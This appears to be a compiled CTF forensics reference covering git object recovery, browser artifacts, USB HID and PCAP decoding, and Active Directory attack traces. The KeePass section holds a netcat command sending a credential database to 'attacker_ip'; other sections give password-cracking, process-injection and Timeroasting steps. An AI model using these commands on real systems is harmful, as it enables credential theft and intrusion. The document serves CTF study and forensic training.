## Git Directory Recovery (UTCTF 2024)

```bash
# Exposed .git directory on web server
gitdumper.sh https://target/.git/ /tmp/repo

# Check reflog for old commits with secrets
cat .git/logs/HEAD
# Download objects from .git/objects/XX/YYYY, decompress with zlib
```

**Tool:** `gitdumper.sh` from internetwache/GitTools is most reliable.

---

## KeePass Database Extraction and Cracking (H7CTF 2025)

**Pattern (Moby Dock):** KeePass database (`.kdbx`) found on compromised system contains SSH keys or credentials for lateral movement.

**Transfer from remote system:**
```bash
# On target: base64 encode and send via netcat
base64 .system.kdbx | nc attacker_ip 4444

# On attacker: receive and decode
nc -lvnp 4444 > kdbx.b64 && base64 -d kdbx.b64 > system.kdbx
```

**Cracking KeePass v4 databases:**
```bash
# Standard keepass2john (KeePass v3 only)
keepass2john system.kdbx > hash.txt

# For KeePass v4 (KDBX 4.x with Argon2): use custom fork
git clone https://github.com/ivanmrsulja/keepass2john.git
cd keepass2john && make
./keepass2john system.kdbx > hash.txt

# Alternative: keepass4brute (direct brute-force)
python3 keepass4brute.py -d wordlist.txt system.kdbx
```

**Wordlist generation from challenge context:**
```bash
# Generate wordlist from related website content
cewl http://target:8080 -d 2 -m 5 -w cewl_words.txt

# Add theme-related keywords manually
echo -e "expectopatronum\nharrypotter\nalohomora" >> cewl_words.txt

# Crack with hashcat (Argon2 = mode 13400)
hashcat -m 13400 hash.txt cewl_words.txt
```

**After cracking — extract credentials:**
1. Open `.kdbx` in KeePassXC with recovered password
2. Check all entries for SSH private keys, passwords, API tokens
3. SSH keys are typically stored in the "Notes" or "Advanced" attachment fields

**Key insight:** Standard `keepass2john` does not support KeePass v4 (KDBX 4.x) databases that use Argon2 key derivation. Use the `ivanmrsulja/keepass2john` fork or `keepass4brute` for v4 support. Generate context-aware wordlists with `cewl` targeting related web services.

---

## Git Reflog and fsck for Squashed Commit Recovery (BearCatCTF 2026)

**Pattern (Poem About Pirates):** Git repository with clean history where data was overwritten and history rewritten via `git rebase --squash`. The original commits survive as orphaned objects.

**Recovery steps:**
```bash
# Check reflog for rebase/squash operations
git reflog --all

# Find orphaned (unreachable) commits
git fsck --unreachable --no-reflogs

# Inspect each unreachable commit
git show <commit-hash>
git diff <commit-hash>^ <commit-hash>

# Extract specific file version from orphaned commit
git show <commit-hash>:path/to/file
```

**Key insight:** `git rebase --squash` removes commits from the branch history but doesn't delete the underlying objects. They remain as unreachable objects until garbage collection runs (`git gc`). Even after `git gc`, objects younger than the expiry period (default 2 weeks) survive. Always check `git reflog` and `git fsck --unreachable` when investigating git repos for hidden data.

**Detection:** Git repo with suspiciously clean history (single commit, or squash-merge commits). Challenge mentions "rewrite", "rebase", "squash", or "clean history".

---

## Browser Artifact Analysis

### Chrome/Chromium

```bash
# Default profile locations
# Linux: ~/.config/google-chrome/Default/
# macOS: ~/Library/Application Support/Google/Chrome/Default/
# Windows: %LOCALAPPDATA%\Google\Chrome\User Data\Default\

# History (SQLite)
sqlite3 "History" "SELECT url, title, datetime(last_visit_time/1000000-11644473600,'unixepoch') FROM urls ORDER BY last_visit_time DESC LIMIT 50;"

# Downloads
sqlite3 "History" "SELECT target_path, tab_url, datetime(start_time/1000000-11644473600,'unixepoch') FROM downloads;"

# Cookies (encrypted on modern Chrome — need DPAPI/keychain key)
sqlite3 "Cookies" "SELECT host_key, name, datetime(expires_utc/1000000-11644473600,'unixepoch') FROM cookies;"

# Login Data (passwords — encrypted)
sqlite3 "Login Data" "SELECT origin_url, username_value FROM logins;"

# Bookmarks (JSON)
cat Bookmarks | python3 -m json.tool | grep -A2 '"url"'

# Local Storage / IndexedDB — LevelDB format
# Use leveldb-dump or strings on LevelDB files
strings "Local Storage/leveldb/"*.ldb | grep -i flag
```

### Firefox

```bash
# Profile location: ~/.mozilla/firefox/*.default-release/
# Find profile
ls ~/.mozilla/firefox/ | grep default

# History + bookmarks (places.sqlite)
sqlite3 places.sqlite "SELECT url, title, datetime(last_visit_date/1000000,'unixepoch') FROM moz_places WHERE last_visit_date IS NOT NULL ORDER BY last_visit_date DESC LIMIT 50;"

# Form history
sqlite3 formhistory.sqlite "SELECT fieldname, value FROM moz_formhistory;"

# Saved passwords (requires key4.db + logins.json)
# Use firefox_decrypt: python3 firefox_decrypt.py ~/.mozilla/firefox/PROFILE/

# Session restore (previous tabs)
python3 -c "
import json, lz4.block
with open('sessionstore-backups/recovery.jsonlz4','rb') as f:
    f.read(8)  # skip magic
    data = json.loads(lz4.block.decompress(f.read()))
    for w in data['windows']:
        for t in w['tabs']:
            print(t['entries'][-1]['url'])
"
```

**Key insight:** Browser artifacts are SQLite databases with non-standard timestamp formats. Chrome uses WebKit epoch (microseconds since 1601-01-01), Firefox uses Unix epoch in microseconds. Always check History, Cookies, Login Data, Local Storage, and session restore files. For encrypted passwords, you need the master key (DPAPI on Windows, keychain on macOS, key4.db on Firefox).

---

## Corrupted Git Blob Repair via Byte Brute-Force (CSAW CTF 2015)

**Pattern (sharpturn):** Git repository with corrupted blob objects. Since git identifies objects by SHA-1 hash, a single-byte corruption changes the hash, making the object unreadable. Repair by brute-forcing each byte position until `git hash-object` produces the expected hash.

```python
import subprocess, shutil

def repair_blob(filepath, target_hash):
    """Brute-force single-byte corruption in a git blob."""
    with open(filepath, 'rb') as f:
        data = bytearray(f.read())

    for pos in range(len(data)):
        original = data[pos]
        for val in range(256):
            if val == original:
                continue
            data[pos] = val
            with open(filepath, 'wb') as f:
                f.write(data)
            result = subprocess.run(
                ['git', 'hash-object', filepath],
                capture_output=True, text=True
            )
            if result.stdout.strip() == target_hash:
                print(f"Fixed byte {pos}: 0x{original:02x} -> 0x{val:02x}")
                return True
            data[pos] = original

    with open(filepath, 'wb') as f:
        f.write(data)
    return False
```

**Workflow:**
1. `git fsck` to identify corrupted objects and their expected hashes
2. Locate the corrupt blob files in `.git/objects/`
3. Decompress with `python3 -c "import zlib; print(zlib.decompress(open('blob','rb').read()))"`
4. Brute-force each byte position (256 values * file_size attempts)
5. Verify with `git hash-object` matching the expected hash

**Key insight:** Git's content-addressable storage means the expected SHA-1 hash is known from the commit tree, even when the blob is corrupted. Single-byte corruption is brute-forceable in seconds. For multi-byte corruption, combine with contextual knowledge (e.g., source code must compile, numeric constants must be valid).

---

## VBA Macro Forensics - Excel Cell Data to ELF Binary (Sharif CTF 2016)

Excel spreadsheet hides an entire executable as numeric cell values. A VBA (Visual Basic for Applications) macro transforms each cell via `CByte((cell_value - 78) / 3)` and writes bytes to produce an ELF (Executable and Linkable Format) binary. Safe analysis: export to CSV, reimplement transform in Python.

```python
import csv
with open('data.csv') as f, open('binary', 'wb') as out:
    for row in csv.reader(f):
        for cell in row:
            if cell.strip():
                out.write(bytes([int((int(cell) - 78) / 3)]))
```

**Key insight:** Malware delivery via spreadsheet cell values with arithmetic transformation. Always reimplement VBA macro logic in Python rather than executing the macro. Check for `olevba` output to extract the transformation formula.

**Detection:** Excel file with large numbers in cells, VBA macro with `CByte`/`Chr`/`Write` operations.

---

## Ethereum / Blockchain Transaction Tracing (Defenit CTF 2020)

Track cryptocurrency through tumbler/mixer services by analyzing on-chain transaction patterns.

```python
import requests
from collections import defaultdict

def trace_ethereum_transactions(address, api_key, depth=3):
    """Trace ETH transactions through tumbler hops"""
    url = f"https://api.etherscan.io/api?module=account&action=txlist&address={address}&apikey={api_key}"
    r = requests.get(url)
    txs = r.json()["result"]

    graph = defaultdict(list)
    for tx in txs:
        graph[tx["from"]].append({
            "to": tx["to"],
            "value": int(tx["value"]) / 1e18,  # Wei to ETH
            "timestamp": int(tx["timeStamp"])
        })

    # Heuristics for tumbler detection:
    # 1. Amount correlation: input ~= output (minus fee)
    # 2. Timing: outputs follow inputs within minutes/hours
    # 3. Fan-out pattern: one input splits to many outputs
    # 4. Round amounts: tumblers often use round ETH values

    # Filter by transaction count (skip high-volume faucets/exchanges)
    suspicious = {addr: txs for addr, txs in graph.items()
                  if 5 < len(txs) < 100}  # Not faucet, not end-user

    return suspicious

# Tools for blockchain forensics:
# - Etherscan API: transaction history, internal transactions
# - Blockchair: multi-chain explorer (BTC, ETH, etc.)
# - Chainalysis Reactor: commercial but referenced in CTFs
# - breadcrumbs.app: free transaction visualization
```

**Key insight:** Blockchain tumblers obscure transaction trails but leave statistical patterns. Track by correlating input/output amounts (minus fees), timing windows, and intermediate wallet transaction counts. Wallets with 10-50 transactions are likely intermediaries; 1000+ are exchanges/faucets to ignore.

---

## Python In-Memory Source Recovery via pyrasite (Insomni'hack 2017)

When a Python process has its source file deleted but is still running, attach to it with `pyrasite-shell` and decompile code objects from memory.

```bash
# 1. Find the running Python process
pgrep -f "python"

# 2. Attach with pyrasite (requires ptrace permissions)
pyrasite-shell <PID>

# 3. Inside the pyrasite shell, enumerate and decompile functions:
import sys, uncompyle6
# List all global variables and functions
for name, obj in globals().items():
    if hasattr(obj, 'func_code'):
        print(f"\n=== {name} ===")
        uncompyle6.main.uncompyle(sys.version_info[0] + sys.version_info[1]/10.0,
                                   obj.func_code, sys.stdout)

# 4. Also check for variables containing secrets
print(globals())  # May contain flags, keys, etc.
```

**Key insight:** `pyrasite` injects a Python shell into a running process via `ptrace`. All code objects and global variables remain in memory even after the source file is deleted. `uncompyle6` decompiles `func_code` objects back to readable Python source. For Python 3.9+ processes, use [`pycdc`](https://github.com/zrax/pycdc) instead (`pycdc` operates on `.pyc` files — write code objects to disk with `marshal.dump` first).

**Detection:** Challenge provides access to a running system where a Python process is active but the `.py` source file has been deleted. `ls -l /proc/<PID>/exe` shows the Python interpreter; `/proc/<PID>/fd/` may still reference the deleted file. Check `ptrace` permissions (`/proc/sys/kernel/yama/ptrace_scope`).


# network-advanced

# CTF Forensics - Network (Advanced)

## Table of Contents
- [Packet Interval Timing-Based Encoding (EHAX 2026)](#packet-interval-timing-based-encoding-ehax-2026)
- [USB HID Mouse/Pen Drawing Recovery (EHAX 2026)](#usb-hid-mousepen-drawing-recovery-ehax-2026)
- [NTLMv2 Hash Cracking from PCAP (Pragyan 2026)](#ntlmv2-hash-cracking-from-pcap-pragyan-2026)
- [TCP Flag Covert Channel (BearCatCTF 2026)](#tcp-flag-covert-channel-bearcatctf-2026)
- [DNS Query Name Last-Byte Steganography (UTCTF 2026)](#dns-query-name-last-byte-steganography-utctf-2026)
  - [DNS Trailing Byte Binary Encoding (UTCTF 2026)](#dns-trailing-byte-binary-encoding-utctf-2026)
- [Multi-Layer PCAP with XOR + ZIP (UTCTF 2026)](#multi-layer-pcap-with-xor--zip-utctf-2026)
- [Brotli Decompression Bomb Seam Analysis (BearCatCTF 2026)](#brotli-decompression-bomb-seam-analysis-bearcatctf-2026)
- [SMB RID Recycling via LSARPC (Midnight 2026)](#smb-rid-recycling-via-lsarpc-midnight-2026)
- [Timeroasting / MS-SNTP Hash Extraction (Midnight 2026)](#timeroasting--ms-sntp-hash-extraction-midnight-2026)
- [ICMP Payload Steganography with Byte Rotation (HackIM 2016)](#icmp-payload-steganography-with-byte-rotation-hackim-2016)
- [Packet Reconstruction via Checksum Validation (Break In 2016)](#packet-reconstruction-via-checksum-validation-break-in-2016)
- [USB HID Keyboard Capture Decoding (EKOPARTY CTF 2016)](#usb-hid-keyboard-capture-decoding-ekoparty-ctf-2016)
- [dnscat2 Traffic Reassembly from DNS PCAP (BSidesSF 2017)](#dnscat2-traffic-reassembly-from-dns-pcap-bsidessf-2017)
- [USB Keyboard LED Morse Code Exfiltration (BITSCTF 2017)](#usb-keyboard-led-morse-code-exfiltration-bitsctf-2017)
- [Unreferenced PDF Objects with Hidden Pages (SharifCTF 7 2016)](#unreferenced-pdf-objects-with-hidden-pages-sharifctf-7-2016)
- [RDP Session Decryption via Extracted PKCS12 Key (HITB 2017)](#rdp-session-decryption-via-extracted-pkcs12-key-hitb-2017)
- [USB HID Keyboard Arrow Key Navigation Tracking (HackIT 2017)](#usb-hid-keyboard-arrow-key-navigation-tracking-hackit-2017)
- [RADIUS Shared Secret Cracking (UConn CyberSEED 2017)](#radius-shared-secret-cracking-uconn-cyberseed-2017)
- [RC4 Stream Identification in Shellcode PCAP (CODE BLUE 2017)](#rc4-stream-identification-in-shellcode-pcap-code-blue-2017)

---

## Packet Interval Timing-Based Encoding (EHAX 2026)

**Pattern (Breathing Void):** Large PCAPNG with millions of packets, but only a few hundred on one interface carry data. The signal is in the **timing gaps** between identical packets, not their content.

**Identification:** Challenge mentions "breathing", "void", "silence", or timing. PCAP has many interfaces but only one has interesting traffic. Packets are identical but spaced at two distinct intervals.

**Decoding workflow:**
```python
from scapy.all import rdpcap

packets = rdpcap('challenge.pcapng')

# 1. Filter to the right interface (e.g., interface 2)
# tshark: tshark -r challenge.pcapng -Y "frame.interface_id == 2" -T fields -e frame.time_epoch

# 2. Compute inter-packet intervals
times = [float(pkt.time) for pkt in packets if pkt.sniffed_on == 'interface_2']
intervals = [times[i+1] - times[i] for i in range(len(times)-1)]

# 3. Identify binary mapping (two distinct interval values)
# E.g., 10ms → 0, 100ms → 1 (threshold at ~50ms)
threshold = 0.05  # 50ms
bits = [0 if dt < threshold else 1 for dt in intervals]

# 4. May need to prepend a leading 0 bit (first interval has no predecessor)
bits = [0] + bits

# 5. Convert bits to bytes (MSB-first)
data = bytes(int(''.join(str(b) for b in bits[i:i+8]), 2)
             for i in range(0, len(bits) - 7, 8))
print(data.decode(errors='replace'))
```

**Key insight:** When identical packets appear on a single interface with only two practical interval values, it's almost certainly binary encoding via timing. The content is noise — the signal is in the gaps. Filter by interface and count unique intervals first.

**Scale tip:** Large PCAPs (millions of packets) often have the signal in a tiny subset. Triage with `tshark -q -z io,phs` to find which interface has the fewest packets — that's likely the data carrier.

---

## USB HID Mouse/Pen Drawing Recovery (EHAX 2026)

**Pattern (Painter):** PCAP contains USB HID interrupt transfers from a mouse/pen device. Drawing data encoded as relative movements with multiple draw modes.

**Packet format (7-byte HID reports):**
| Byte | Field | Notes |
|------|-------|-------|
| 0 | Button state | 0x01 = pressed (may be constant) |
| 1 | Mode/pad | 0=hover, 1=draw mode 1, 2=draw mode 2 |
| 2-3 | dx (int16 LE) | Relative X movement |
| 4-5 | dy (int16 LE) | Relative Y movement |
| 6 | Wheel | Usually 0 |

**Extraction and rendering:**
```python
import struct
from PIL import Image, ImageDraw

# Extract HID data
# tshark -r capture.pcap -Y "usb.transfer_type==1" -T fields -e usb.capdata

packets = []
with open('hid_data.txt') as f:
    for line in f:
        raw = bytes.fromhex(line.strip().replace(':', ''))
        if len(raw) >= 7:
            btn = raw[0]
            mode = raw[1]
            dx = struct.unpack('<h', raw[2:4])[0]
            dy = struct.unpack('<h', raw[4:6])[0]
            packets.append((btn, mode, dx, dy))

# Accumulate positions per mode
SCALE = 5
positions = {0: [], 1: [], 2: []}
x, y = 0, 0
for btn, mode, dx, dy in packets:
    x += dx
    y += dy
    positions[mode].append((x, y))

# Render each mode separately (different colors = different text layers)
for mode in [1, 2]:
    pts = positions[mode]
    if not pts:
        continue
    min_x = min(p[0] for p in pts) - 100
    min_y = min(p[1] for p in pts) - 100
    max_x = max(p[0] for p in pts) + 100
    max_y = max(p[1] for p in pts) + 100
    w = (max_x - min_x) * SCALE
    h = (max_y - min_y) * SCALE
    img = Image.new('RGB', (w, h), 'white')
    draw = ImageDraw.Draw(img)
    for i in range(1, len(pts)):
        x0 = (pts[i-1][0] - min_x) * SCALE
        y0 = (pts[i-1][1] - min_y) * SCALE
        x1 = (pts[i][0] - min_x) * SCALE
        y1 = (pts[i][1] - min_y) * SCALE
        # Skip long jumps (pen lifts)
        if abs(pts[i][0]-pts[i-1][0]) < 50 and abs(pts[i][1]-pts[i-1][1]) < 50:
            draw.line([(x0,y0),(x1,y1)], fill='black', width=3)
    img.save(f'mode_{mode}.png')
```

**Key techniques:**
- **Separate modes:** Different button/mode values draw different text layers — render each independently
- **Skip pen lifts:** Large dx/dy jumps indicate pen was lifted, not drawn — filter by distance threshold
- **High resolution:** Scale 5-8x with margins for readable handwriting
- **Time gradient:** Color points by temporal order (rainbow gradient) to trace stroke direction
- **Character segmentation:** Group consecutive same-mode points by large X gaps to isolate characters

**Alternative: AWK extraction + SVG rendering (faster pipeline):**
```bash
# Extract capdata and convert to signed deltas in one pass
tshark -r pref.pcap -Y "usb.transfer_type==0x01 && usb.endpoint_address==0x81 && usb.capdata" \
  -T fields -e usb.capdata > capdata.txt

awk '
function hexval(c){ return index("0123456789abcdef",tolower(c))-1 }
function hex2dec(h, n,i){ n=0; for(i=1;i<=length(h);i++) n=n*16+hexval(substr(h,i,1)); return n }
function s16(u){ return (u>=32768)?u-65536:u }
{ d=$1; if(length(d)!=14) next
  btn=hex2dec(substr(d,3,2))
  x=s16(hex2dec(substr(d,7,2) substr(d,5,2)))
  y=s16(hex2dec(substr(d,11,2) substr(d,9,2)))
  print btn, x, y }' capdata.txt > deltas.txt
```
Then render with SVG (Python) — filter on pen-down state (button=2), accumulate deltas, flip Y axis, draw strokes between consecutive pen-down points.

**Difference from keyboard HID:** Mouse HID uses relative movements (accumulated), keyboard uses keycodes (direct). Mouse drawing requires rendering; keyboard requires keymap lookup.

---

## NTLMv2 Hash Cracking from PCAP (Pragyan 2026)

**Pattern ($whoami):** SMB2 authentication in packet capture.

**Extraction:** From NTLMSSP_AUTH packet, extract: server challenge, NTProofStr, and blob.

**Brute-force with known password format:**
```python
import hashlib, hmac
from Crypto.Hash import MD4

def try_password(password, username, domain, server_challenge, blob, expected_proof):
    nt_hash = MD4.new(password.encode('utf-16-le')).digest()
    identity = (username.upper() + domain).encode('utf-16-le')
    ntlmv2_hash = hmac.new(nt_hash, identity, hashlib.md5).digest()
    proof = hmac.new(ntlmv2_hash, server_challenge + blob, hashlib.md5).digest()
    return proof == expected_proof
```

---

## TCP Flag Covert Channel (BearCatCTF 2026)

**Pattern (pCapsized):** Suspicious TCP packets with chaotic flag combinations (FIN+SYN, SYN+RST+PSH+URG, etc.). The 6 TCP flag bits encode base64 characters.

**Decoding:**
```python
from scapy.all import rdpcap, TCP

pkts = rdpcap('capture.pcap')
suspicious = [p for p in pkts if TCP in p and p[TCP].dport == 5748]

# Map 6-bit flag value to base64 alphabet
b64 = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
encoded = ''.join(b64[p[TCP].flags & 0x3F] for p in suspicious)

import base64
flag = base64.b64decode(encoded).decode()
```

**Key insight:** TCP has 6 standard flag bits (FIN, SYN, RST, PSH, ACK, URG) = values 0-63, matching the base64 alphabet exactly. Unusual flag combinations on otherwise normal-looking packets indicate covert channel usage. Filter by destination port or source IP to isolate the channel.

**Detection:** Packets with nonsensical flag combinations (e.g., FIN+SYN simultaneously). Consistent destination port. Packet count is a multiple of 4 (base64 alignment).

---

## DNS Query Name Last-Byte Steganography (UTCTF 2026)

**Pattern (Last Byte Standing):** PCAP with DNS queries where data is encoded in the last byte of each query name.

**Identification:** Many DNS queries to unusual or sequential subdomains. The meaningful data is NOT in the query name itself but in the final byte/character of each name.

**Decoding workflow:**
```python
from scapy.all import rdpcap, DNS, DNSQR

packets = rdpcap('last-byte-standing.pcap')

data = []
for pkt in packets:
    if pkt.haslayer(DNSQR):
        qname = pkt[DNSQR].qname.decode(errors='replace').rstrip('.')
        if qname:
            data.append(qname[-1])  # Last character of query name

# Reconstruct message from last bytes
message = ''.join(data)
print(message)
# May need additional decoding (hex, base64, etc.)
```

**Variants:**
- Last byte of each subdomain label (split on `.`)
- Specific character position (first, Nth, last)
- Hex-encoded bytes across multiple queries
- Subdomain labels as base32/base64 chunks (DNS tunneling)
- **Trailing byte after DNS question structure** (see below)

**Key insight:** DNS exfiltration often hides data in query names. When queries look random but follow a pattern, extract specific character positions. The "last byte" pattern is simple but effective — each query contributes one byte to the message.

**Detection:** Large number of DNS queries to a single domain, queries with no legitimate purpose, sequential or patterned subdomain names.

### DNS Trailing Byte Binary Encoding (UTCTF 2026)

**Pattern (Last Byte Standing variant):** Each DNS query packet contains a single extra byte appended AFTER the standard DNS question structure (after the null terminator + Type A + Class IN fields). The extra byte is `0x30` ('0') or `0x31` ('1'), encoding one bit per packet.

**Decoding workflow:**
```python
from scapy.all import rdpcap, DNS, DNSQR, Raw

packets = rdpcap('challenge.pcap')

bits = []
for pkt in packets:
    if pkt.haslayer(DNSQR):
        # Get raw DNS payload
        raw = bytes(pkt[DNS])
        # Standard DNS question ends at: header(12) + qname + null(1) + type(2) + class(2)
        qname = pkt[DNSQR].qname
        expected_len = 12 + len(qname) + 1 + 2 + 2  # +1 for leading length byte
        if len(raw) > expected_len:
            trailing = raw[expected_len:]
            for b in trailing:
                bits.append(chr(b))  # '0' or '1'

# Convert bit string to ASCII (MSB-first, 8-bit chunks)
bitstring = ''.join(bits)
flag = ''.join(chr(int(bitstring[i:i+8], 2)) for i in range(0, len(bitstring) - 7, 8))
print(flag)
```

**Key insight:** Data is hidden not in the DNS query name but in extra bytes padding the packet after the question record. Wireshark hex inspection reveals non-standard packet lengths. Each trailing byte represents ASCII '0' or '1', forming a binary stream that decodes to the flag.

**Detection:** DNS packets slightly larger than expected for their query name. Hex dump shows `0x30`/`0x31` bytes after the Class IN field (`00 01`). Consistent query domain across all packets.

---

## Multi-Layer PCAP with XOR + ZIP (UTCTF 2026)

**Pattern (Half Awake):** PCAP with multiple protocol layers hiding data. Requires protocol-aware extraction, XOR decryption with a key found in-band, and merging parallel data streams.

**Detailed workflow:**

1. **Inspect HTTP streams** for instructions or hints (e.g., "mDNS names are hints", "Not every TCP blob is what it pretends to be")
2. **Identify fake protocol streams:** A TCP stream labeled as TLS may actually contain a raw ZIP file (PK magic bytes `50 4b`). Check raw hex of suspicious streams
3. **Extract XOR key from mDNS:** Look for mDNS TXT records (e.g., `key.version.local`) containing the XOR key
4. **XOR-decrypt** the extracted data using the mDNS key
5. **Merge parallel datasets** using printability as selector

```python
import string
from scapy.all import rdpcap, Raw, DNS, DNSRR

packets = rdpcap('half-awake.pcap')

# 1. Extract XOR key from mDNS TXT record
xor_key = None
for pkt in packets:
    if pkt.haslayer(DNSRR):
        rr = pkt[DNSRR]
        if b'key' in rr.rrname.lower():
            xor_key = int(rr.rdata, 16)  # e.g., 0xb7

# 2. Extract fake TLS stream (look for PK header in raw TCP data)
# Use Wireshark: tcp.stream eq N → Export raw bytes
# Or extract with scapy by filtering the right stream

# 3. XOR-decrypt two datasets from ZIP contents
def xor_decrypt(data, key):
    return bytes(b ^ key for b in data)

p1 = xor_decrypt(stage1_data, xor_key)
p2 = xor_decrypt(stage2_data, xor_key)

# 4. Merge using printability: take the printable character from each position
flag = ''.join(
    chr(p1[i]) if chr(p1[i]) in string.printable and chr(p1[i]).isprintable()
    else chr(p2[i])
    for i in range(len(p1))
)
print(flag)
```

**Key insight:** When a PCAP contains two XOR-decoded byte arrays of equal length where neither alone produces readable text, merge them character-by-character using printability as the selector — take whichever byte at each position is a printable ASCII character. The XOR key is often hidden in an in-band protocol like mDNS TXT records rather than requiring brute-force.

**Indicators:**
- HTTP stream with meta-instructions ("not every TCP blob is what it pretends to be")
- TCP stream with mismatched protocol dissection (Wireshark shows TLS but raw bytes contain PK/ZIP headers)
- mDNS queries for suspicious service names (e.g., `key.version.local`)
- Two data files of identical length in extracted archive

---

## Brotli Decompression Bomb Seam Analysis (BearCatCTF 2026)

**Pattern (Cursed Map):** HTTP download of a file that decompresses to gigabytes (decompression bomb). The flag is sandwiched between two bomb halves at a seam in the compressed data.

**Identification:** Compressed data shows a repeating block pattern (e.g., 105-byte period). One block breaks the pattern — the flag is at this discontinuity.

```python
import brotli

with open('flag.txt.br', 'rb') as f:
    data = f.read()

# Find the repeating block size
block_size = 105  # Determined by comparing adjacent blocks
for i in range(0, len(data) - block_size, block_size):
    if data[i:i+block_size] != data[i+block_size:i+2*block_size]:
        seam_offset = i + block_size
        break

# Decompress only the anomalous block
dec = brotli.Decompressor()
result = dec.process(data[seam_offset:seam_offset+block_size])
# Flag is in the decompressed output
```

**Key insight:** Decompression bombs use highly repetitive compressed data. The flag breaks this repetition, creating a detectable anomaly in the compressed stream. Compare adjacent fixed-size blocks to find the discontinuity, then decompress only that region — no need to decompress the entire multi-gigabyte output.

**Detection:** File with extreme compression ratio (MB → GB), HTTP Content-Encoding: br, or file identified as Brotli. Tools hang or OOM when trying to decompress.

---

## SMB RID Recycling via LSARPC (Midnight 2026)

**Pattern (UntilTime):** PCAP with SMB2 authentication followed by RPC calls over `\pipe\lsarpc`. The attacker enumerates Active Directory accounts by iterating RIDs (Relative Identifiers) through LSARPC functions.

**Identification:** SMB2 session setup with multiple authentication attempts (null session, Guest, random username), followed by RPC bind to LSARPC and repeated `LsaLookupSids` calls with incrementing RIDs.

**Wireshark analysis:**
```bash
# Filter SMB2 authentication attempts from attacker IP
tshark -r capture.pcapng -Y "ip.src == 198.51.100.16 && smb2.cmd == 1"

# Look for LSARPC RPC calls
tshark -r capture.pcapng -Y "dcerpc.cn_bind_to_str contains lsarpc"
```

**RPC call sequence:**
1. `LsaOpenPolicy` — opens a policy handle on the target
2. `LsaQueryInformationPolicy` — extracts the domain SID (e.g., `S-1-5-21-...`)
3. `LsaLookupSids` — resolves SIDs to account names by iterating RIDs (1000, 1001, 1002, ...)

**Key insight:** Guest account authentication (often enabled by default) grants enough access to enumerate domain accounts via LSARPC. The attacker constructs SIDs by appending incrementing RIDs to the domain SID and calling `LsaLookupSids` for each. Valid accounts return their name; invalid RIDs return errors. This technique is called **RID cycling** or **RID brute-forcing**.

**Detection indicators:**
- Multiple `LsaLookupSids` requests with sequential RIDs
- Guest authentication success followed by RPC pipe connection
- High volume of LSARPC traffic from a single source

---

## Timeroasting / MS-SNTP Hash Extraction (Midnight 2026)

**Pattern (UntilTime):** After enumerating valid machine account RIDs via RID recycling, the attacker sends NTP requests with those RIDs to extract HMAC-MD5 authentication material from the domain controller's MS-SNTP responses.

**Background:** Microsoft's MS-SNTP extends standard NTP with Netlogon authentication in Active Directory environments. The client places a domain RID in the NTP `Key Identifier` field (4 bytes, little-endian). The domain controller responds with an HMAC-MD5 signature derived from the machine account's NTLM hash — leaking crackable authentication material.

**Wireshark extraction:**
```bash
# Filter NTP traffic from attacker
tshark -r capture.pcapng -Y "ntp && ip.src == 10.16.13.13" -T fields -e udp.payload
```

**Convert Key Identifier to RID:**
```bash
# NTP Key Identifier is 4 bytes, little-endian
echo "<key_id_hex>" | sed 's/\(..\)/\1 /g' | awk '{print "0x"$4$3$2$1}' | xargs printf "%d\n"
```

**NTP response payload structure (68 bytes):**

| Offset | Length | Field |
|--------|--------|-------|
| 0-47 | 48 | Salt (NTP header + extensions) |
| 48-51 | 4 | Key Identifier (RID, little-endian) |
| 52-67 | 16 | HMAC-MD5 crypto-checksum |

**Hash reconstruction for Hashcat (mode 31300):**
```python
import sys
from struct import unpack

def to_hashcat_form(hex_payload):
    data = bytes.fromhex(hex_payload.strip())
    salt = data[:48]
    rid = unpack('<I', data[-20:-16])[0]
    md5hash = data[-16:]
    return f"{rid}:$sntp-ms${md5hash.hex()}${salt.hex()}"

if len(sys.argv) != 2:
    print("Usage: python sntp_to_hashcat.py <hex_payload>")
    sys.exit(1)

print(to_hashcat_form(sys.argv[1]))
```

**Cracking with Hashcat:**
```bash
# Mode 31300 = MS-SNTP (Timeroasting)
hashcat -m 31300 -a 0 -O hashes.txt rockyou.txt --username
```

**Example hash format:**
```text
1108:$sntp-ms$d7d0422d66705c6189c1d20aed76baa4$1c0111e900000000000a09314c4f434ced4c979d652b89f1e1b8428bffbfcd0aed4ca3bbb1338716ed4ca3bbb133cf3a
```

**Key insight:** MS-SNTP responses from domain controllers leak HMAC-MD5 authentication material tied to machine account NTLM hashes. Unlike Kerberoasting (which targets service accounts), Timeroasting targets **machine accounts** whose passwords are often weak or predictable (e.g., lowercase hostname). Any valid RID triggers a response — no special privileges required beyond network access to the DC's NTP service (UDP 123).

**Full attack chain:**
1. Authenticate to SMB as Guest
2. Enumerate valid RIDs via LSARPC RID recycling
3. Send MS-SNTP requests with discovered RIDs
4. Extract HMAC-MD5 hashes from NTP responses
5. Crack offline with Hashcat mode 31300

---

## ICMP Payload Steganography with Byte Rotation (HackIM 2016)

Data hidden in ICMP echo request/reply payloads with byte-level rotation encoding:

```python
from scapy.all import rdpcap, ICMP

packets = rdpcap('challenge.pcap')
icmp_data = b''
for pkt in packets:
    if pkt.haslayer(ICMP) and pkt[ICMP].type == 8:  # Echo request
        icmp_data += bytes(pkt[ICMP].payload)

# Apply byte rotation (Caesar cipher on bytes)
SHIFT = 42
decoded = bytes((b - SHIFT) % 256 for b in icmp_data)

# Result may be base64-encoded
import base64
plaintext = base64.b64decode(decoded)
```

**Key insight:** ICMP payloads are often ignored by analysts focused on TCP/UDP. Check for non-standard payload sizes or non-zero data in ICMP packets. Common encoding layers: byte rotation -> base64 -> shell commands.

---

## Packet Reconstruction via Checksum Validation (Break In 2016)

Reconstruct corrupted/incomplete packets by using protocol checksums as validation:

1. **Identify missing bytes** from packet structure analysis (Ethernet, IP, TCP headers)
2. **Brute-force missing values** and validate against:
   - IP header checksum (16-bit ones' complement)
   - TCP checksum (includes pseudo-header)
3. **Extract data** from reconstructed payload

```python
import struct

def ip_checksum(header_bytes):
    """Compute IP header checksum"""
    words = struct.unpack('!' + 'H' * (len(header_bytes) // 2), header_bytes)
    s = sum(words)
    while s >> 16:
        s = (s & 0xFFFF) + (s >> 16)
    return ~s & 0xFFFF

# Brute-force missing byte to match expected checksum
for candidate in range(256):
    header = header_template[:missing_offset] + bytes([candidate]) + header_template[missing_offset+1:]
    if ip_checksum(header) == 0:  # Valid checksum sums to 0
        print(f"Missing byte: 0x{candidate:02x}")
```

